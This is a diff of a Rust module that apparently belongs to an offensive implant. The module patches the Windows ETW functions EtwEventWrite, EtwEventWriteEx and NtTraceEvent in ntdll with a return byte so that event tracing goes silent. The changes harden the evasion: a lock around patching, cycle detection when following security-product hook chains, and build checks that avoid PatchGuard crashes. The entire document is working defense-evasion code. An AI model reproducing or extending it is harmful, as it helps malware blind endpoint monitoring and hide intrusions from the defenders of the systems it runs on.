@@ -27,6 +27,7 @@
 //! indirect syscall (no kernel32 IAT entries).
 
 #[cfg(windows)]
+use common::lock::MutexExt;
 use std::sync::atomic::AtomicU8;
 
 /// Saved original first byte of `EtwEventWrite` (0 = never patched).
@@ -45,6 +46,13 @@ static ORIG_NT_TRACE: AtomicU8 = AtomicU8::new(0);
 mod imp {
     use super::{ORIG_ETW_WRITE, ORIG_ETW_WRITE_EX, ORIG_NT_TRACE};
     use std::sync::atomic::Ordering;
+    use std::sync::Mutex;
+
+    /// Mutex that serialises `patch_one` / `unpatch_one` so that the
+    /// (change_protect → write → restore_protect) sequence is never
+    /// interleaved across threads.  Contention is expected to be extremely
+    /// rare (patching happens once at startup; unpatching at shutdown).
+    static PATCH_LOCK: Mutex<()> = Mutex::new(());
 
     /// PAGE_READWRITE (0x04) — local constant to avoid winapi import.
     /// We only need write access to plant the ret byte; the original protection
@@ -111,33 +119,37 @@ mod imp {
             return 0;
         }
         let mut addr = func_addr;
+        let mut visited = [0usize; MAX_HOOK_CHAIN_DEPTH];
+        let mut visited_count = 0usize;
         for _ in 0..MAX_HOOK_CHAIN_DEPTH {
             let first = *(addr as *const u8);
-            if first == 0xE9 {
+            let dest = if first == 0xE9 {
                 // Near relative jmp: destination = addr + 5 + rel32
                 let rel = *(addr.wrapping_add(1) as *const i32) as isize;
-                let dest = (addr as isize).wrapping_add(5).wrapping_add(rel) as usize;
-                if dest == 0 {
-                    break;
-                }
-                addr = dest;
+                let d = (addr as isize).wrapping_add(5).wrapping_add(rel) as usize;
+                if d == 0 { break; }
+                d
             } else if first == 0xFF && *(addr.wrapping_add(1) as *const u8) == 0x25 {
                 // RIP-relative indirect jmp: slot = addr + 6 + disp32
                 // absolute target = *slot (8-byte pointer)
                 let disp = *(addr.wrapping_add(2) as *const i32) as isize;
                 let slot = (addr as isize).wrapping_add(6).wrapping_add(disp) as usize;
-                if slot == 0 {
-                    break;
-                }
-                let dest = *(slot as *const usize);
-                if dest == 0 {
-                    break;
-                }
-                addr = dest;
+                if slot == 0 { break; }
+                let d = *(slot as *const usize);
+                if d == 0 { break; }
+                d
             } else {
                 // No further hook — addr is the real function body.
                 break;
+            };
+
+            // Cycle detection: if we've seen this destination before, stop.
+            if visited[..visited_count].contains(&dest) {
+                break;
             }
+            visited[visited_count] = dest;
+            visited_count += 1;
+            addr = dest;
         }
         addr
     }
@@ -152,6 +164,10 @@ mod imp {
         if target == 0 {
             return false;
         }
+
+        // Serialize the read → change_protect → write → restore_protect
+        // sequence so it cannot interleave with an unpatch on another thread.
+        let _guard = PATCH_LOCK.lock_recover();
 
         let first_byte = *(target as *const u8);
 
@@ -186,6 +202,10 @@ mod imp {
         if target == 0 {
             return false;
         }
+
+        // Serialize with patch_one so the restore sequence cannot interleave
+        // with a concurrent patch on another thread.
+        let _guard = PATCH_LOCK.lock_recover();
 
         let original = orig.load(Ordering::Relaxed);
         // 0 means we never patched this function (all real ntdll exports start
@@ -345,14 +365,14 @@ pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) -> anyhow:
 
     match mode {
         EtwPatchMode::Never => {
-            log::debug!("etw_patch: mode=never; ETW patch skipped");
+            tracing::debug!("etw_patch: mode=never; ETW patch skipped");
             return Ok(());
         }
         EtwPatchMode::Safe => {
             // SAFETY: PEB read only; no memory modification here.
             if let Some(build) = peb_build_number() {
                 if build >= PATCHGUARD_ETW_BUILD_THRESHOLD {
-                    log::warn!(
+                    tracing::warn!(
                         "etw_patch: Windows build {} >= {} (Win 11 24H2+); \
                          ETW direct-patch skipped in safe mode to avoid PatchGuard BSOD. \
                          Set malleable_profile.etw_patch_mode = 'always' to force patching \
@@ -362,7 +382,7 @@ pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) -> anyhow:
                     );
                     return Ok(());
                 }
-                log::debug!(
+                tracing::debug!(
                     "etw_patch: Windows build {} < {}; applying ETW patch",
                     build,
                     PATCHGUARD_ETW_BUILD_THRESHOLD
@@ -370,17 +390,17 @@ pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) -> anyhow:
             } else {
                 // Could not read the PEB build number — proceed conservatively
                 // (apply the patch; this mirrors pre-check behaviour).
-                log::debug!("etw_patch: could not read PEB OSBuildNumber; applying ETW patch");
+                tracing::debug!("etw_patch: could not read PEB OSBuildNumber; applying ETW patch");
             }
         }
         EtwPatchMode::Always => {
-            log::debug!("etw_patch: mode=always; applying ETW patch regardless of build number");
+            tracing::debug!("etw_patch: mode=always; applying ETW patch regardless of build number");
         }
     }
 
     let patched = imp::patch_etw();
     if patched {
-        log::debug!("etw_patch: ETW functions patched successfully");
+        tracing::debug!("etw_patch: ETW functions patched successfully");
     } else {
         return Err(anyhow::anyhow!(
             "ETW patch verification failed: no functions were patched"
@@ -391,7 +411,7 @@ pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) -> anyhow:
 
 #[cfg(not(windows))]
 pub unsafe fn patch_etw_with_mode(_mode: common::config::EtwPatchMode) -> anyhow::Result<()> {
-    Ok(())
+    Err(anyhow::anyhow!("ETW patching is only available on Windows"))
 }
 
 /// Patch `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` in ntdll.dll
